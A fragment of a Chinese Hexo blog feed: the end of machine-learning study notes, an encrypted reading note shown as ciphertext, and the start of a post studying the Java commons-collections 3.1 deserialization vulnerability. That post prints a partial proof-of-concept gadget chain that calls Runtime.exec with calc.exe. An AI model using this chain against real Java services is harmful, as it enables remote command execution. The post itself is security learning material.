tree）"></a>树集合（Ensembles tree）</h4><p>由于原本的决策树会受到某个数据的改变而产生巨大变化，则通过不同数据创建多个树</p><p>替换：例如在十个样例中，每次抽取一个样例，然后再放回，再在十个之中抽取一个</p><p>xgboost：增大下次决策时抽取上次失败的样例的概率</p><h4 id="回归树"><a href="#回归树" class="headerlink" title="回归树"></a>回归树</h4><p>例如要预测 xx 脸 xx 耳朵动物的体重，则根据方差权重后的差值来选择</p><p><img src="/2023/10/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/ZD1rbCYIlor2ggxULDKch0ognhc.png"></p><h2 id="无监督学习算法"><a href="#无监督学习算法" class="headerlink" title="无监督学习算法"></a>无监督学习算法</h2><h3 id="k-means-聚类算法"><a href="#k-means-聚类算法" class="headerlink" title="k-means 聚类算法"></a>k-means 聚类算法</h3><p>在数据集中随机取 n 个点（簇质心），对于所有数据，选择离得最近的点，然后将 n 个点移到最近的点的平均值上，重复以上步骤直到这 n 个点不再变化</p><h2 id="代价"><a href="#代价" class="headerlink" title="代价"></a>代价</h2><h3 id="代价函数"><a href="#代价函数" class="headerlink" title="代价函数"></a>代价函数</h3><p>j 来代表数据与预测值之间的差</p><h4 id="平方误差成本函数"><a href="#平方误差成本函数" class="headerlink" title="平方误差成本函数"></a>平方误差成本函数</h4><p><img src="/2023/10/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/Iwptb7HaFozSF4x1qdOcEdEPncb.png"></p><p>在计算逻辑回归的时候会导致代价函数变成如下，就不能使用梯度下降来得到合理值了</p><p><img src="/2023/10/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/IW5jballao1cT6xGf0XcDBEAnNg.png"></p><h4 id="逻辑回归损失函数"><a href="#逻辑回归损失函数" class="headerlink" title="逻辑回归损失函数"></a>逻辑回归损失函数</h4><p>也叫 binary cross-entropy function 二进制交叉熵</p><p>根据预估是 1 还是 0 来选择自己的模型 L 是 loss 函数</p><p><img src="/2023/10/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/Z5QJbPxRCoRezaxA55ocri3qn6e.png"></p><p><img src="/2023/10/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/G37bbpRaYof7YexLBHWcHgDtnng.png"></p><p>例如 y&#x3D;1，预估值为</p><p><img src="/2023/10/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/YzaNbkVRFogThnxm4edcTI3RnAf.png"></p><p>会得到如下函数，越接近 1 计算出来的成本 loss 就会越小，越接近 0loss 越大而且增长率高</p><p><img src="/2023/10/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/MNbUb1A4Io7E5KxsvUtcEnTfnsh.png"></p><h4 id="-1"><a href="#-1" class="headerlink" title=""></a></h4><h4 id="softmax-回归损失函数"><a href="#softmax-回归损失函数" class="headerlink" title="softmax 回归损失函数"></a>softmax 回归损失函数</h4><p>Sparse categorical cross-entropy 稀疏范畴交叉熵</p><p>可以输出多种结果而非二分</p><p>与上同理，当 y&#x3D;1，得到的 a1 越接近 1 损失越小</p><p><img src="/2023/10/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/KcDWbrGQJoSbv6xB3JKcyPtXnJb.png"></p><h4 id="熵"><a href="#熵" class="headerlink" title="熵"></a>熵</h4><p>用来衡量纯洁度，越接近百分之五十的时候熵越高，即越不纯洁</p><p><img src="/2023/10/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/HsgTbjCLoo7Q6Gx7aJ8cG65YnAf.png"></p><p><img src="/2023/10/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/Qr2ybCcuiouDR8x1xyAcIK0LnQh.png"></p><h3 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h3><h4 id="梯度下降"><a href="#梯度下降" class="headerlink" title="梯度下降"></a>梯度下降</h4><p>在坡顶找一个下坡最快的位置走上一小步</p><p>学习率 α 太高导致跳过最低点，太低导致运行速度慢：寻找最大合理值</p><p>偏导数通过斜率来决定这一步走多长，随着接近局部最小值，变化率降低</p><p>如何检测是代码错误还是学习率不当？ –&gt; 将学习率设置的非常小来检查</p><p><img src="/2023/10/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/EUF0blAYUog6FLxqK6McsrTAnAg.png"></p><p>检查是否收敛：j-迭代次数图或者自动收敛测试</p><h5 id="亚当算法（优化器）"><a href="#亚当算法（优化器）" class="headerlink" title="亚当算法（优化器）"></a>亚当算法（优化器）</h5><p>修改学习率</p><h4 id="正规方程"><a href="#正规方程" class="headerlink" title="正规方程"></a>正规方程</h4><p>无需迭代，但是只适用于线性回归 速度慢</p><h3 id="-2"><a href="#-2" class="headerlink" title=""></a></h3><h2 id="拟合问题"><a href="#拟合问题" class="headerlink" title="拟合问题"></a>拟合问题</h2><p><img src="/2023/10/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/T49Gb1Wqlon1hKxoX25cQCA0nLm.png"></p><p><img src="/2023/10/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/EDbBbism1oFAEJxkDKPcj8W9no1.png"></p><h3 id="欠拟合（高偏差）-high-bias"><a href="#欠拟合（高偏差）-high-bias" class="headerlink" title="欠拟合（高偏差） high bias"></a>欠拟合（高偏差） high bias</h3><p>算法不准确</p><h3 id="泛化"><a href="#泛化" class="headerlink" title="泛化"></a>泛化</h3><p>让算法在处理未测试的数据集的时候仍有优秀的预测</p><h3 id="过拟合（高方差）-high-variance"><a href="#过拟合（高方差）-high-variance" class="headerlink" title="过拟合（高方差） high variance"></a>过拟合（高方差） high variance</h3><p>算法对数据集中所有数据精确处理但是失去了预测的能力</p><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p><img src="/2023/10/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/RJjvbf5ilojXJ0xWFu8ceFW9nSc.png"></p><h4 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h4><p>减少与增加</p><h4 id="多项式回归"><a href="#多项式回归" class="headerlink" title="多项式回归"></a>多项式回归</h4><p>改变 x 的次数</p><h4 id="增加数据集"><a href="#增加数据集" class="headerlink" title="增加数据集"></a>增加数据集</h4><p>一味地增加数据集效果有限，对高方差的效果会好</p><p><img src="/2023/10/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/ENppbIPl2oNdsVxhxU3c9WaxnNc.png"></p><p><img src="/2023/10/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/SPidbbN8kodoyqxaklhcaXQenHh.png"></p><p>特征选择：减少相关性弱的特征，避免多项式表达能力过强</p><h4 id="正则化"><a href="#正则化" class="headerlink" title="正则化"></a>正则化</h4><p>保留相关特征，减少权重</p><p>使用场景：特征多但是不能确认哪个特征是有用或者无用的 lambda 需要选择合适的大小</p><p><img src="/2023/10/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/Jv6cbzReHonIutx3XtIca0fXn2N.png"></p><p>正则化线性回归梯度下降</p><p><img src="/2023/10/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/ExehbmkdzoUmJrxkqggcqNq3nHh.png"></p><p>正则化逻辑回归梯度下降</p><p><img src="/2023/10/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/SiX6bNCCOoEPOXxGow6c8eR7n4c.png"></p><h4 id="lambda"><a href="#lambda" class="headerlink" title="lambda"></a>lambda</h4><p>增大 lambda 导致模型简化</p><p><img src="/2023/10/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/IqLAbUt1SoRgZQxK2YLcvBQcnJe.png"></p><p>lambda 增大会导致 j train 不断增大（越来越偏离测试集）</p><p>lanbda 过大—过拟合  过小—近似常数方程</p><h3 id="诊断"><a href="#诊断" class="headerlink" title="诊断"></a>诊断</h3><p>训练：得到 j train 和多组已经完成了拟合的参数</p><p>选择模型（交叉验证）：得到 j cv 函数查看哪一组参数的误差小然后做出选择</p><p>测试：模拟现实情况来评估泛化能力</p><p>高偏差：在训练集上存在较大误差</p><p>高方差：j cv 远大于 j train 在交叉验证集中的误差远大于训练集上的误差（训练误差小，其他大）</p><p>高方差 + 高偏差：j cv 远大于 j train 而且 j train 很高</p><h1 id="-3"><a href="#-3" class="headerlink" title=""></a></h1><h2 id="-4"><a href="#-4" class="headerlink" title=""></a></h2>]]></content>
    
    
    <categories>
      
      <category>人工智能</category>
      
    </categories>
    
    
    <tags>
      
      <tag>人工智能</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>《局外人》--意义</title>
    <link href="/2023/09/24/%E3%80%8A%E5%B1%80%E5%A4%96%E4%BA%BA%E3%80%8B-%E6%84%8F%E4%B9%89/"/>
    <url>/2023/09/24/%E3%80%8A%E5%B1%80%E5%A4%96%E4%BA%BA%E3%80%8B-%E6%84%8F%E4%B9%89/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="e588d9c9b1e40ab10f3579eb2ed3590c375938f075225dacd17257e5e55601aa">d7bee52400958b566309f151f53f4d872233b505a00d3d0cd2cafd9c626ea9b4b37d1bc8c199ce21910c19908250eceb030d94266b54a82670d775a0c82cf755e7b40ddd2708334faea7f3edf4028fbd27d30a8e4aaaf771d74b978f9e3195030a55a4362dfd5bbc87e9dc5c5f7252bac295ec788f0d35f9e6a715eca15f4f2220ead484eb5addd2d693bf0505c0536dc86d61b574ef64d4c6401a762cff142e6fc83987190f5e7d7685fe6d35055cfa12a767c663d20e1948c2e55b38c1f821aad97db616837a36ac52c252288f835fd1ee77460d44a3ecd395bf56208f73718b45c080af91887b0cf63e2cb1d0864bccf7df52ee3dff28ffd1614e9ba148246af95553eef44b1abc010df89f6a7f2b9d06b2e5f6c487e6148e627f37704072c083b642ba851ad605bcc2164ae14c11b3d6f5c1364a23715f6c25fa8967e00361e2fbd31d00a7313a32cb0b1703e8f4ec4c34020cd65853c0d9748d5b07e88b0e4692183cb0ed303f5d34af8a72cf41824c07b3b621f9b932d627adc0cbbff46d2b136bd598bf3d37879c1f1e8a2c0ec8a7f9c31257891c8ca7c02bfda162dc454da7a96bc6191403f3caa5d0e0bdeef29c847a92c14808a39b13b490c3e5782c2c86101cc50b4477ebbe4c12335881a6619fb8e854e7ed10a63fdce5e6f53735ced9a914550d64ad95840fa55f4e2257fef964d68493be52423a3579d8c080da1fdbe4dac48c788c4e9d05e7b6d25458f6675f67a1fe88a488758913c823dfba9c9d7df02668c22eda2e396cef4f98584d77d4d595a819a9e3f1cd7c3fbd91166f858bff945ec9d8750b4a03db11febe813c1e20116647ff8ceb847ba7cb5da241360a449145b19a090f1d02978fe5dd4da6fcbffb8d7c53078d68d2e41fbb7d625108007825b231e2486f9a66a78dcb26e24e74813a2fde2dcf6595d556e85411d99742405e4d153bad1d15d250bf5e088cb0a92c896d71c7d14be037f12517a7f553d23159425b6d9bc200ae271a2961a1c208d5a5a001206823bb1b185ccdeae35e07b4ec4f114aca893311d4f209a1b23cd8948d064fbfe11c5bab9b172b1b018f82d4e5c303abb9a4eca40e998139d209283bd8f91bc2360497c31304a4f2ae99a6df242da13b4b3388dbf31a69f55495e93c45089ca60d06c0fbf0106583e4a401525bacbcae1d85818b6bb117168a1df0278401b009bf18b914cb2ecda8854a922f22e64d5d3b4181645a100bc9cae1ab874336101a2362dff7be4050794b058730e10c0c4bae338a77807b4dba8dac8ef8ed9b436a2b2a86fafcd87ac907212987c92ca3ce0d55ad6e2504781f25e47fc7ac38d990a1a356569656c7646b6698181a47183099aedaa132a8d670031dcdfc4d8cf6302585d078676509809adcdbf023c5fda97a8d18db4f67bf12320f57c1ef66ad131686c359a9d6152b609259e413318707696088b46807a5923d43f1993154a7d4b445f0668f5d4fde6db6d8c83eb1597a15a9dd434daab69f3fddc15c13675e0e93ee189fc90fcd2c72c64921235266735162b1371e7bd09bda8b0857d37fd6e8768195b2e6338834f4fde9803adf7eb88eb4168e60888552c58be7ea4c855dab52ec0e9c652c7240a1cc1d4f826975bfe79348ba849f537da27bfafb379bcee056f139212136fa40728be6b471d684a18d5df3f747b1c7c94568c2f93bbe151834362ce36b113c56ba4ebf3b2678877b9c18c5345cfae9ed1f712a2fdb0e90b33ae3d1eea42c7faf4bd7c44518a1c725d9f02a9e7ec911466b4263dd3646710ef5fd4e09e67b6ad09486d40717f848cf334dc0ad704e7c6c00a36d1c796187c1b15def7b867ef015a9ca5ee7906f82e76b343218b4fb1a6a71eee855665c68a9fc0131c54ff25806ed13baf98743b757582e2a2251d5a59c6eeadacaf0b0c350930abcb55da5ed35890dd4d4a702b23b81439d53409f763a4a563839ceb25ccb77dd23d4a6df7d38ce164052d93c569329049b1ceb7cd6255587c4cbed9686db2b5e40b8da2e3321d88c3ab1a5a0b41a19f42b2200ce958935af517d99b86e86bac19fb0f3cd6e30766981bf9cccf0360885f0b429227abfba49527a67f42b9d850a4bc63cbc8f5a58d484fee53ac6a864da99d7a169ca28361ba2e836f90439847c99bffc83e0620fbaecdb2e43cf31f4b512a9f87d46f428761a3d30aca766c381b9704e7417f9c0eab172c685527002e1d1fa1ad50e07ad9eace27b142755be525512fa4a557f223f5eeb2c20233ffd88293256ff97d5402468bc9b83c0821e22cb2bd843b45a161f98e7e18b301f0c446bdbf3da7916c5230cc05ce8b908154c903b987dada4e256819adaf84f07c9b2b230bdec2882a5ed9aea17ace0a3b1d49f4fc2c29f2e1f8e33831fa5e112db11f8cfd18ac9fd081d73ea90697aed6d08f2ad16a31c2ab77bbb10ec0b1feb082f3ee74be0a8ccff08b9f7ae5c7640a1ab63aadd8d85dda05ec171c79a7f982a42f60d77866ca80c0d411731979cabf923c5659ef6818622fec80fd3d30d6972d96ceba63f063ecee63e9d7b31c599dbe75ceef0d44290bcddda3a2776ac15e7f610d2675fe755e33d8017305ad42518ab007e66ea2b4503810f54a392234bf92150b1e09af24e758615bd5dafa6e3e716ea5f414e76c23afbb4d2e8adc9a759ecb3e600e16c0b8fc43d5f39bb56726495b2f830d68964ad823f0393d28744cedc2d8717079eecbfa952190e18274c311aadc2e0dbf9a90968ae5c6b5419354713a4fff5c60a90bb7a614cd390381a915f12baaedcbf4a8eb758f75473301ff316d6184d26451f713f098211a3425e68a32332435bf0e8de65c2faa7f618e7ea91b8b76663dbaba22d45814c23881c25f28e72a2fa3ae09c06fb48e17fdfd75477f497edad31cc558f73f59cf19051ca085f90b423c3933eea84392528d28ee258ba3d284439dce2e02f6be3744b9e7baf5bc75c5366e6024088ee494ef86e2727c00e9ea9cccac4469c3d50188826c70e709bc128fa9acd52608463fde4f173e6d2b5faec66ef71be3297ae2aa9fc05a29b3fca8e78c1abc7722eb23b8860a1ef0cb3616478993b2d502abdc982278341fcd053971b12b7e6f83fa26542a2a15b4df7cc34e7a7cb8e4e60d6522b2943418515ca7f686c9cfb7fb1d322c4d3751a0f0c410573c9dfa50dbf42e28a6d566d0fa9d1307dd64fcaa67d79a4bb634f9bcb9b6dc0f08db4e6843ebd78c4f6211a99074b5469601c32e6ae0961fa258dbb5aedcde1ec10f33fd6ec260b053a939f7ed6f315b80873cdc5cd3727e1433afac7186e4ce56429a2f294128af05234ccf088784c280322f690f4758303b56be8f9b1d73b33106b60d977ce82cc0ee162d16cd5f76dd927221844894dbba15b4e97f6a775a1cade79d5e60c9b93bf09ec15e08fcc599b3de0995a4ceb263677111f225351914efc41c78a39d8bdc5b7a811dea9a7ce13b8c4ccfe4a6232fc0aa7ef300a14c580185c8e1d6e7d20d872f22250fd214b07048cc040bff3a777248f975ef2fcf2c0c95da0d7e4bf5b5d6815c9349051675a8680d632365b628a10bed4fca6ca690222bdaac68576397d13376eebcacca62af61f792f8a507e3f359658336b675e51ace6228fc2d5a7188a57e08880f363413daefec9aca767ed05315b2bc8b092e3bf73cf342cfcde675709be9ee0464246c61730356b1d563db60bc58501566dfb1843e4ba0f14ccef372964f4c9063a991fa32cb220a98a1234c96c6cd4789a550197f07285f995d4b4846d6b55ef135cc959832b1ddfa0110d9501dab07f984fa0f15bb46f4aa1105d692b49b23f20a481b3bb61ea1b57d280a9a75dca4367e0178ee5af855adb8d3f4bcaca9bd2722f7732c45d699374a0922e84205da20f01af918e859a5c77c9a342b4dbc34d872f7a83bef397851f7af6ed73d260fb745d7af6383320cf9d7721846d02f60ef32a75c85dfd9b18bc98d96844029eb916202e5f81e7f314ecd9f2805b3a11d16945e48d24584b2813bfaa7aa48accc78093dbc59e9dc36a4ced216c61dea0de82f796a96475c0bde61bafd629f24219a01fcd86fa6cd23dbab166d910b797d6a8ee63e7f4adc78deadd9ed7cbef1d2d2d5dc40ad8a6426cb4c056e67261719b1cc4b72825c6afcd464132c0accdb27715bf9bc0600c4139dc55336c8ab6c1de7c79c24f051635dc0ada71e5966a804cb033d2f05e6247a0c5bd780b0d6b7dea012148e6bd2e4c2c163c66acbedb016aac17897cd6aceae9485c1e3ed36458c008f4f1f07cea7cd59fc036a065ae417f29c302311aae6a98d5332f5b618c416b0e883589f81cd8b1ad994a0c5cea160ca16b252a31359e6dce6f7fdf1f013cd9cd28a31157341b6913844627c533ad2ca29a95e34137cf314e9f87a11c8122e7890a61d814107f3046037e46df98f241ec6bd839ad9177418a1bad7a4a25632a7050130b9b871aca60b0017554234f698720890136aa922db5189d80d3150e456b244932a7accdc60721b5c66295ea539bc734791f47e4be256cfcff13c5307b60a58555f5aedffb2b6215bd2e29d3337d612af1dea8c8d4e45187ca24762013290b5b4a093b2d73dc67cc3456cc60c4ffacbc50ff0cdfcd3abbee5e3ac36d40f0930956bb1fbaaf636f14d5aa9c25c094bfcf9e807ed0886a6539836fe485ca904b6160aec17bb3f041f0ddd0e162a37641f577191f40d585326aa42fd97cb5a84b7dfefeecf7aa93fd6ba55ef77c1e3eb0453b7c0c736665668591409d28e4fb9948b0f2c2052aa1f4a3a55e1c15600ef7b2871e6132019cd896af42932f6b54c59294fb7b23df8c620ee9ebb0b6fd7451267fed0c848422f82b2f09553399f89fbd75c7268195ff96e4bae979ca2453e7be8b7b2a2aeb97edcdbfd077faa5c8dc64054b874a2402ce8d8f6c51ffe86d766a49e3d43cb7ad003576c193fefad236e7536671288b2b6505b1b5cee776f8abc3f06b4d2827f42197cf8e5fc4dc0736778b4abe61065ae21397470bd9010a17e54e10e50e4df11ad6316cf9b58137a824cb3a3cdbbd3de01671593a849f6098a0b41ccf6fc196ac89c7568d2f31eded0665a25dcaef71040f94bc8b67fdd30c648a38fb707e70ee7f5df8b6405deb61c01709a23366a962298f343e740ded0fbd57b22402e0ae6c503f0efa2aa54789f48ee7e57f4656f043189712721f1c7b9de1c62c6e972af1ceb49b66b5991bf032bf76b1f672e250730f99d917cf0a993ba6f04eef6e367a298a83b0b251827793314ab444c582793fdc65012a330e0a9026230d2bb490663b9e6fe9713e3de5915d1509c3d0bd8b7a2d4e8c5c6b068fdad8fe485f3309010badfcffd16115534b6c77bddaef46cb0acd74642d6598a3127bf1f87e84cd9ff59984a91cd1525ac37b69fc07386eabe3d9c928b7c942f2763a053bcba793aa4491bc00955c1e993bfdddc2b2397a9bb8db717afe73566c89febe9071493b8f4fa06f6523c072192e7f6c9cf9afa50cc04bb848870ca971bb312fc9996dbafb6f42d4d887011fc7b9da7cbc29c0fe90e588977b184782d736604180b2ae7cbe5fda270bbcd82ebb7063ce13424842003987edf6ddc87df7a3c96aaa21d37df140e9eac4dea490bfe50758bd981577fbd5e590541920295f7e8c9d571990e0af2bfe31dab8a679a2ec1cd64399b280200bbd5aa4003707c11c0740bdc2531cb8b2713dbc42e4b5e9a36ae0cc51b1284b6fc3bc61eff13059ca070715ab41ac109ce8f5caa001c60ec47ab4d946978a84cc7b6f360ebdf821adc53dd7bb72c4b6634643b6a33372604785080415c98385bad52ceb7a12a1c155786c8172fe49f22a05f03a9b1162b2d8fb6dbddcc661de2f565530ece3b452c4a23da39a1914e246b7666bcdd7edb582a91e8e0ed4bbf6c3a091715c628d2144a020c79455553e47f506eebfb29689bf22475fd2a672b835ddd2af00a70ee907374798b80674bdac372bde3e07abdd089d07163ffab75a470dbb3b426556c183a4ccd7d2d41c3ec270e0e5c2804ebed3b3a001bdcf739fe001e0ea92c468aa02411948592730e6db1fae7b4db6706d2cbd6eb834825569592ab76bd825fe4fe6a490be0a8d9cd111e905881e9715dc1073541574725d844ed165ef96a06a6888d3ae42aee4a88be80d4ddd85a738d8bba8a7ef9ce3f77f399be5edfd7562f5a952d8caf0df30f5e6d43c07f8736fd74996d768d75f67254213b656cdf344fd5f3f78a36f3afecea6868506918ff3379264f643ba18d18add7e647e83e48b15c42cc158c0f461dfbba954ce220fcd22e4efab62011e3c98c7008171480abecf692e3aa7823b976ac76c931c1e66d1c87984619ff791d41d2622222eb6565bcba0fc4c6649cc87e239542d7d989cda2094810406d02be837b40edce41f70b3fab1d1e2e04848ae035cc54c8ed29e230945af31139caaae80c9fff037db422e33a47a6f313d8a40af1f2442c6b5720a2da3bc3b3062fe15dcd8474dad77ca0382e1128bfefc2a8dad47740d97dcd03aa4a5d19ac93297e058a37872b342b15d8c7485d6d3b1497293f43e04cf2ca0dbfaed3e6c4953c47fbb19105365be7f92868b1eb3f289428fc7d33e9a3a7a8cc336231f0869e518d92a8b878b347e73ee128f3c8d390c2aaed1144b414bbfcd3b0a6df8cbae315d3aeb0beafa4aedd9580b65ab782bcecc252563f3b5bc5c6061182b947a2b678211f5aa3d601d409ece631f0346945b919ba504b6507c8df45f22fce7e5da9f9f235293b06169f4f43c0e2268810f185ed104277282e51bff3f41f6d2fd7092b3e62db9bd7659d09595d7ffc130ee54ae8455fac91328c1aa68679f597f7f5a5e466ba7223a94b0b994781f6ea3b2ecf181d85c88a1b2d5f40fde2064464b29514cd31fbcad17edf5ad9cc6ca0a8eda7e3a340ecc8e464aebdbaaac0d101d48a449d98fb8c1d91690009e8f71484babe1d7b5c812129dfc85f961fa923124538d2bbb01981f2a5f137283502aca0dd6dc5f0741608cca337d0c34a09a20da3b79ce19870c284c5cd167a2110f309d03d84155982b2db458d944bd68c90d5b0d1e48058c468d5668c740c3106fa488b16f72af8e2e5884c05de8009791f7c8d333b78d8e5b7ca49e35e17744616d8361eaa93114cd82bff4a66494f5cdf06b6b21734ba4ba9e25a0100c5864ee3814eb46b7b992895a2b9b35a7d13ac84bc0f0d7068aaf18196861c26d9b7fc3425260488ac2c5bfe35dd97b65cd7359ae7c53e558b482dfe4c39d03e4eb2b87aea91d6beb82e92c3c097d71274d1dec31ab4b18b2ec17a553a97e928c1b1cf4cf446a230f3f6075b53b2ff414013c1d861c764c27643c72d8e61ac421c531c4876abe8eede95d91585e3dcb29f15c8765d958021da8b628044a2f5c76b59ea7bd6efdb9cf7a3a5d5519e7a7b0f02823d53c849acc4e8dd3ef0d3a6cb0015357671188e49f6e4c86de33f9d7948b357da6e7120b6e0d02abaa706ccc8110e034355b71e6622207a19f1235ec6c95e55200877e48a7bdb7d8fe4a60467652b8d8ff9e7af5f8db12d3d0e6884abac13dbe0bc3fc0c838dae07959f2d61fbaba40be60b9768c6173186b4da336cf8ed7b0c3ee215d5b9ba0aedb0f38b8a534abbfd7e1658b906d893f698f34ee9719d240b9990af292f7c3ae399431ea1f2d3ef6d63c1a29c6f7b743231bad140700cbfd71c043bb10b5d749e1494a3b6</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">需要密码才可以访问噢</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>阅读笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>阅读笔记</tag>
      
      <tag>think</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java-commons-collections-3.1反序列化漏洞学习</title>
    <link href="/2023/09/24/java-commons-collections-3-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
    <url>/2023/09/24/java-commons-collections-3-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="JAVA反序列化分析思路"><a href="#JAVA反序列化分析思路" class="headerlink" title="JAVA反序列化分析思路"></a>JAVA反序列化分析思路</h1><p>从危险函数出发开始寻找不同类的同名函数实现任意方法调用（反射&#x2F;动态加载字节码）</p><h1 id="反射基础"><a href="#反射基础" class="headerlink" title="反射基础"></a>反射基础</h1><p><img src="/2023/09/24/java-commons-collections-3-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/af6f7ed4fa494b017fd94674d1acac2b.png" alt="截图"></p><p>r是一个Runtime实例，c是一个Runtime类，对c使用反射（getMethod）来获取exec方法，然后在r上调用这个方法</p><h1 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ApacheSerialize</span> &#123;<br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>     Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>             <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>             <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;String.class, Class[].class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>] &#125;),<br>             <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;Object.class, Object[].class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>] &#125;),<br>             <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;String.class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;)<br>     &#125;; <span class="hljs-comment">//将transformers数组存入ChaniedTransformer这个继承类</span><br> <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br></code></pre></td></tr></table></figure><p><img src="/2023/09/24/java-commons-collections-3-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/76c5bf29875d23dd7251f61ea7166a4e.png" alt="截图"> </p><br/><h1 id="漏洞利用分析"><a href="#漏洞利用分析" class="headerlink" title="漏洞利用分析"></a>漏洞利用分析</h1><h2 id="InvokerTransformer（反射利用点）"><a href="#InvokerTransformer（反射利用点）" class="headerlink" title="InvokerTransformer（反射利用点）"></a>InvokerTransformer（反射利用点）</h2><p>首先是由InvokerTransformer类中的transform实现了任意方法调用的同时还在构造函数中导致参数可控<img src="/2023/09/24/java-commons-collections-3-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/0decef64baffec427ca8503b6055d012.png" alt="截图"></p><p>上面的java反射就相当于</p><p><img src="/2023/09/24/java-commons-collections-3-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/451006b45403e4916ae89c1bac57168c.png" alt="截图"></p><p>（实际上自己构造的时候在IDE中直接看需要填入的变量还是挺方便的，这里不太好看懂）</p><p>如以下语句就可以实现命令执行</p><p><img src="/2023/09/24/java-commons-collections-3-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/797821b047a0aa1970d24586a60e6e61.png" alt="截图"></p><p><strong>将Runtime实例传入transfrom，cls就获取了Runtime类，method获取了Runtime类中的exec方法，然后对Runtime实例使用传入的传输calc</strong></p><p>poc如下<img 